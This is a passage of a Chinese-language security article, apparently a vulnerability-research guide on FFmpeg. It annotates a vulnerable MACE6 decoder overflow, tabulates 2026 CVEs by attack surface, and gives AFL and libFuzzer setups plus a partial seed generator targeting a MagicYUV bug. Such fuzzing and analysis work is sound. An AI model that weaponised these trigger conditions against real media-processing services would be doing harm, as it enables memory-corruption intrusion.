+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">bytes_per_packet</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 每个输入字节解码出6个采样</span>
+<span class="w">        </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">input_byte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avpkt</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 实际写入的采样数 = bytes_per_packet * 6</span>
+<span class="w">            </span><span class="c1">// 但缓冲区大小基于溢出后的sample_count!</span>
+<span class="w">            </span><span class="o">*</span><span class="n">samples</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mace6_decode_sample</span><span class="p">(</span><span class="n">input_byte</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">);</span>
+<span class="w">            </span><span class="c1">// 当samples指针超出缓冲区时 → 堆越界写!</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">*</span><span class="n">got_frame_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes_per_packet</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│           CVE-2026-66039: 有符号整数溢出至堆溢出                  │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  CAF文件结构:                                                    │
+│  ┌─────────────────────────────────────────┐                     │
+│  │ CAF Header                              │                     │
+│  │ ┌─────────────────────────────────┐     │                     │
+│  │ │ desc chunk                      │     │                     │
+│  │ │   bytes_per_packet = 0x00010000 │     │  ← 攻击者控制       │
+│  │ │   frames_per_packet = 0x00010000│     │  ← 攻击者控制       │
+│  │ └─────────────────────────────────┘     │                     │
+│  │ ┌─────────────────────────────────┐     │                     │
+│  │ │ data chunk                      │     │                     │
+│  │ │   [恶意音频数据]                │     │                     │
+│  │ └─────────────────────────────────┘     │                     │
+│  └─────────────────────────────────────────┘                     │
+│                                                                  │
+│  整数溢出计算:                                                   │
+│    bytes_per_packet = 0x10000 (65536)                           │
+│    frames_per_packet = 0x10000 (65536)                          │
+│                                                                  │
+│    sample_count = bytes_per_packet <span class="gs">* frames_per_packet           │</span>
+<span class="gs">│                 = 65536 *</span> 65536                                  │
+│                 = 4294967296 (0x100000000)                      │
+│                 → 截断为32位有符号: 0 (或取决于具体实现)          │
+│                                                                  │
+│    分配: malloc(0 <span class="gs">* sizeof(int16_t)) → 极小缓冲区               │</span>
+<span class="gs">│    写入: bytes_per_packet *</span> 6 个采样 = 393216个int16_t          │
+│    → 堆溢出! (写入786432字节到极小缓冲区)                       │
+│                                                                  │
+│  根因: 有符号整数乘法无溢出检查 (CWE-196)                       │
+│  结果: 缓冲区分配过小 → 堆越界写 (CWE-787)                      │
+│  影响: 内存破坏，可能的代码执行                                   │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<hr />
+<h2>6. FFmpeg主要攻击面汇总</h2>
+<p>以下表格系统梳理了FFmpeg的主要攻击面和代表性漏洞：</p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────────────┐
+│                    FFmpeg 主要攻击面与代表性漏洞                         │
+├──────────┬────────────────────────┬──────────────┬──────────┬──────────┤
+│ 攻击面   │ 组件                   │ 漏洞类型     │ CVE      │ CVSS     │
+├──────────┼────────────────────────┼──────────────┼──────────┼──────────┤
+│          │ MagicYUV解码器         │ 堆越界写     │2026-8461 │ 8.8      │
+│          │ MACE6音频解码器        │ 有符号整数   │2026-66039│ 8.7      │
+│          │                        │ 溢出→堆溢出  │          │          │
+│ Codec层  │ LCL/ZLIB视频解码器     │ 信息泄露     │2026-66038│ 7.1      │
+│ (解码器) │ ADX音频解码器          │ OOB读/写     │  -       │  -       │
+│          │ S/PDIF muxer           │ OOB读        │  -       │  -       │
+│          │ PNG/APNG编码器         │ 堆越界写     │2026-66040│ 8.7      │
+├──────────┼────────────────────────┼──────────────┼──────────┼──────────┤
+│          │ hqdn3d降噪滤镜         │ 堆越界写     │2026-66036│ 7.7      │
+│ Filter层 │ vf_quirc QR码滤镜      │ 堆越界写     │2026-66041│ 7.7      │
+│ (滤镜)   │ vf_hqdn3d              │ 缓冲区不足   │2026-66036│ 7.7      │
+├──────────┼────────────────────────┼──────────────┼──────────┼──────────┤
+│          │ MOV/MP4 demuxer        │ 整数溢出     │2026-30999│ 7.5      │
+│ Demuxer  │ (CENC subsample)       │ →堆溢出      │          │          │
+│ 层(解复用)│ IAMF demuxer           │ 资源耗尽     │2026-66037│ 7.1      │
+│          │ AVI demuxer            │ 各种         │  多个    │  变化    │
+├──────────┼────────────────────────┼──────────────┼──────────┼──────────┤
+│ Protocol │ HTTP/RTP/TCP           │ SSRF/资源    │  多个    │  变化    │
+│ 层(协议) │ file://                │ 耗尽         │          │          │
+├──────────┴────────────────────────┴──────────────┴──────────┴──────────┤
+│                                                                         │
+│  共同特征:                                                              │
+│  1. 所有漏洞均可通过处理恶意媒体文件触发                                 │
+│  2. 不需要认证 (服务器自动处理上传文件)                                  │
+│  3. 涵盖视频、音频、字幕、图片等多种媒体类型                             │
+│  4. 一个漏洞影响所有链接FFmpeg的下游项目                                 │
+│  5. MagicYUV解码器在所有默认构建中启用                                   │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>2026年7月批漏洞详细列表</h3>
+<table>
+<thead>
+<tr>
+<th>CVE编号</th>
+<th>CVSS</th>
+<th>组件</th>
+<th>漏洞类型</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-66036</td>
+<td>7.7</td>
+<td>vf_hqdn3d滤镜</td>
+<td>堆越界写</td>
+<td>内存破坏，可能RCE</td>
+</tr>
+<tr>
+<td>CVE-2026-66037</td>
+<td>7.1</td>
+<td>IAMF demuxer</td>
+<td>资源耗尽</td>
+<td>DoS (17字节文件→126MB分配)</td>
+</tr>
+<tr>
+<td>CVE-2026-66038</td>
+<td>7.1</td>
+<td>LCL/ZLIB解码器</td>
+<td>信息泄露</td>
+<td>堆内存泄露，ASLR绕过</td>
+</tr>
+<tr>
+<td>CVE-2026-66039</td>
+<td>8.7</td>
+<td>MACE6音频解码器</td>
+<td>有符号整数溢出→堆越界写</td>
+<td>内存破坏，可能RCE</td>
+</tr>
+<tr>
+<td>CVE-2026-66040</td>
+<td>8.7</td>
+<td>PNG/APNG编码器</td>
+<td>堆越界写</td>
+<td>确定性内存破坏，可能RCE</td>
+</tr>
+<tr>
+<td>CVE-2026-66041</td>
+<td>7.7</td>
+<td>vf_quirc滤镜</td>
+<td>堆越界写</td>
+<td>内存破坏</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>7. Fuzzing发现FFmpeg漏洞的方法</h2>
+<p>Fuzzing是发现FFmpeg漏洞最有效的方法之一。以下展示使用AFL和libFuzzer对FFmpeg进行Fuzzing的配置方法。</p>
+<h3>7.1 使用AFL Fuzzing FFmpeg</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># build_ffmpeg_afl.sh - 使用AFL编译FFmpeg</span>
+
+<span class="c1"># 1. 下载FFmpeg源码</span>
+git<span class="w"> </span>clone<span class="w"> </span>https://git.ffmpeg.org/ffmpeg.git
+<span class="nb">cd</span><span class="w"> </span>ffmpeg
+
+<span class="c1"># 2. 使用AFL的编译器编译</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">CC</span><span class="o">=</span>afl-gcc
+<span class="nb">export</span><span class="w"> </span><span class="nv">CXX</span><span class="o">=</span>afl-g++
+
+<span class="c1"># 关键: 启用ASAN检测内存错误</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AFL_USE_ASAN</span><span class="o">=</span><span class="m">1</span>
+
+<span class="c1"># 配置: 最小化构建，只包含需要fuzz的组件</span>
+./configure<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--cc<span class="o">=</span><span class="nv">$CC</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-debug<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-stripping<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-doc<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-programs<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-ffmpeg<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-ffplay<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-ffprobe<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-network<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-decoder<span class="o">=</span>magicyuv<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-decoder<span class="o">=</span>mace6<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-demuxer<span class="o">=</span>avi<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-demuxer<span class="o">=</span>mov<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-demuxer<span class="o">=</span>caf<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-protocol<span class="o">=</span>file<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--extra-cflags<span class="o">=</span><span class="s2">&quot;-fsanitize=address -fno-omit-frame-pointer -g&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--extra-ldflags<span class="o">=</span><span class="s2">&quot;-fsanitize=address&quot;</span>
+
+make<span class="w"> </span>-j<span class="k">$(</span>nproc<span class="k">)</span>
+
+<span class="c1"># 3. 准备种子语料库</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/ffmpeg_corpus
+<span class="c1"># 使用FFmpeg自身生成各种格式的种子文件</span>
+./ffmpeg<span class="w"> </span>-f<span class="w"> </span>lavfi<span class="w"> </span>-i<span class="w"> </span><span class="nv">testsrc</span><span class="o">=</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>.1<span class="w"> </span>-c:v<span class="w"> </span>magicyuv<span class="w"> </span>/tmp/ffmpeg_corpus/magicyuv.avi
+./ffmpeg<span class="w"> </span>-f<span class="w"> </span>lavfi<span class="w"> </span>-i<span class="w"> </span><span class="nv">sine</span><span class="o">=</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>.1<span class="w"> </span>-c:a<span class="w"> </span>pcm_s16le<span class="w"> </span>/tmp/ffmpeg_corpus/audio.wav
+
+<span class="c1"># 最小化语料库</span>
+afl-cmin<span class="w"> </span>-i<span class="w"> </span>/tmp/ffmpeg_corpus<span class="w"> </span>-o<span class="w"> </span>/tmp/ffmpeg_corpus_min<span class="w"> </span>--<span class="w"> </span>./ffmpeg<span class="w"> </span>-i<span class="w"> </span>@@<span class="w"> </span>-f<span class="w"> </span>null<span class="w"> </span>-
+
+<span class="c1"># 4. 启动Fuzzing</span>
+afl-fuzz<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-i<span class="w"> </span>/tmp/ffmpeg_corpus_min<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-o<span class="w"> </span>/tmp/ffmpeg_findings<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-m<span class="w"> </span>none<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-t<span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--<span class="w"> </span>./ffmpeg<span class="w"> </span>-i<span class="w"> </span>@@<span class="w"> </span>-f<span class="w"> </span>null<span class="w"> </span>-
+</code></pre></div>
+
+<h3>7.2 使用libFuzzer Fuzzing FFmpeg解码器</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// ffmpeg_decoder_fuzzer.c - libFuzzer针对FFmpeg解码器的fuzzer</span>
+<span class="c1">// 编译: clang -g -O1 -fsanitize=fuzzer,address \</span>
+<span class="c1">//   -I/path/to/ffmpeg libavcodec/libavcodec.a libavutil/libavutil.a \</span>
+<span class="c1">//   ffmpeg_decoder_fuzzer.c -o ffmpeg_decoder_fuzzer \</span>
+<span class="c1">//   -lm -lz -lpthread</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libavcodec/avcodec.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libavutil/imgutils.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libavutil/opt.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+
+<span class="c1">// 目标解码器 - 可配置为不同的解码器</span>
+<span class="cp">#define TARGET_DECODER AV_CODEC_ID_MAGICYUV</span>
+
+<span class="k">static</span><span class="w"> </span><span class="n">AVCodecContext</span><span class="w"> </span><span class="o">*</span><span class="n">codec_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="k">static</span><span class="w"> </span><span class="n">AVCodecParserContext</span><span class="w"> </span><span class="o">*</span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="k">static</span><span class="w"> </span><span class="n">AVFrame</span><span class="w"> </span><span class="o">*</span><span class="n">frame</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="k">static</span><span class="w"> </span><span class="n">AVPacket</span><span class="w"> </span><span class="o">*</span><span class="n">pkt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">initialized</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">LLVMFuzzerInitialize</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">***</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// 注册所有编解码器</span>
+<span class="w">    </span><span class="n">avcodec_register_all</span><span class="p">();</span><span class="w">  </span><span class="c1">// 旧版API</span>
+<span class="w">    </span><span class="c1">// 或使用新版API: 不需要显式注册</span>
+
+<span class="w">    </span><span class="c1">// 查找目标解码器</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">AVCodec</span><span class="w"> </span><span class="o">*</span><span class="n">codec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avcodec_find_decoder</span><span class="p">(</span><span class="n">TARGET_DECODER</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">codec</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Codec not found</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 分配编解码器上下文</span>
+<span class="w">    </span><span class="n">codec_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avcodec_alloc_context3</span><span class="p">(</span><span class="n">codec</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">codec_ctx</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 设置一些参数</span>
+<span class="w">    </span><span class="n">codec_ctx</span><span class="o">-&gt;</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1280</span><span class="p">;</span>
+<span class="w">    </span><span class="n">codec_ctx</span><span class="o">-&gt;</span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">32</span><span class="p">;</span>
+<span class="w">    </span><span class="n">codec_ctx</span><span class="o">-&gt;</span><span class="n">coded_width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1280</span><span class="p">;</span>
+<span class="w">    </span><span class="n">codec_ctx</span><span class="o">-&gt;</span><span class="n">coded_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">32</span><span class="p">;</span>
+<span class="w">    </span><span class="n">codec_ctx</span><span class="o">-&gt;</span><span class="n">pix_fmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AV_PIX_FMT_YUV420P</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 打开编解码器</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">avcodec_open2</span><span class="p">(</span><span class="n">codec_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">codec</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Could not open codec</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">frame</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">av_frame_alloc</span><span class="p">();</span>
+<span class="w">    </span><span class="n">pkt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">av_packet_alloc</span><span class="p">();</span>
+
+<span class="w">    </span><span class="n">initialized</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">LLVMFuzzerTestOneInput</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">initialized</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 将fuzzer输入作为压缩数据包</span>
+<span class="w">    </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
+<span class="w">    </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 发送数据包到解码器</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avcodec_send_packet</span><span class="p">(</span><span class="n">codec_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">pkt</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 接收解码后的帧</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avcodec_receive_frame</span><span class="p">(</span><span class="n">codec_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">frame</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// 帧解码成功，重置帧</span>
+<span class="w">        </span><span class="n">av_frame_unref</span><span class="p">(</span><span class="n">frame</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 刷新解码器</span>
+<span class="w">    </span><span class="n">avcodec_flush_buffers</span><span class="p">(</span><span class="n">codec_ctx</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>7.3 针对特定漏洞的定向Fuzzing</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">CVE-2026-8461 定向Fuzzing种子生成器</span>
+<span class="sd">生成针对MagicYUV解码器slice_height验证的种子文件</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">generate_magicyuv_seed</span><span class="p">(</span><span class="n">output_dir</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">count</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">100</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;生成针对MagicYUV slice_height的定向种子&quot;&quot;&quot;</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">output_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="c1"># 关键变异点: slice_height值</span>
+    <span class="c1"># 正常值: 偶数 (2, 4, 8, 16, 32, 64...)</span>
+    <span class="c1"># 漏洞触发值: 奇数 (1, 3, 5, 7, ..., 31, 33...)</span>
+
+    <span class="n">interesting_slice_heights</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="c1"># 边界值</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>
+        <span class="c1"># 奇数值 (触发漏洞)</span>
+        <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span>
+        <span class="c1"># 大值</span>
+        <span class="mh">0x7FFFFFFF</span><span class="p">,</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span>
+        <span class="c1"># 2的幂</span>
+        <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span>
+    <span class="p">]</span>
+
+    <span class="n">interesting_heights</span> <span class="o">=</span> <span class="p">[</span><span class="mi">16</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">256</span><span class="p">]</span>
+    <span class="n">interesting_widths</span> <span class="o">=</span> <span class="p">[</span><span class="mi">16</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">640</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1920</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
+        <span class="n">slice_h</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">interesting_slice_heights</span><span class="p">)</span>
+        <span class="n">height</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">interesting_heights</span><span class="p">)</span>
+        <span class="n">width</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">interesting_widths</span><span class="p">)</span>
+
+        <span class="c1"># 生成AVI种子</span>
+        <span class="n">seed_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">output_dir</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;seed_</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">04d</span><span class="si">}</span><span class="s2">.avi&quot;</span><span class="p">)</span>
+        <span class="n">generate_avi_seed</span><span class="p">(</span><span class="n">seed_path</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">,</span> <span class="n">slice_h</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 生成 </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s2"> 个定向种子到 </span><span class="si">{</span><span class="n">output_dir</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">generate_avi_seed</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">width</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">height</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">slice_h</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;生成单个AVI种子文件 (简化版)&quot;&quot;&quot;</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="c1"># 最小AVI + MagicYUV头</span>
+        <span class="c1"># 包含变异的slice_height值</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;RIFF&#39;</span><span class="p">)</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># 文件大小占位</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AVI &#39;</span><span class="p">)</span>
+        <span class="c1"># ... (AVI结构构造，参考第3.5节)</span>
+        <span class="c1"># 关键: 在MagicYUV码流中写入变异的slice_height</span>
+        <span class="k">pass</span>
+
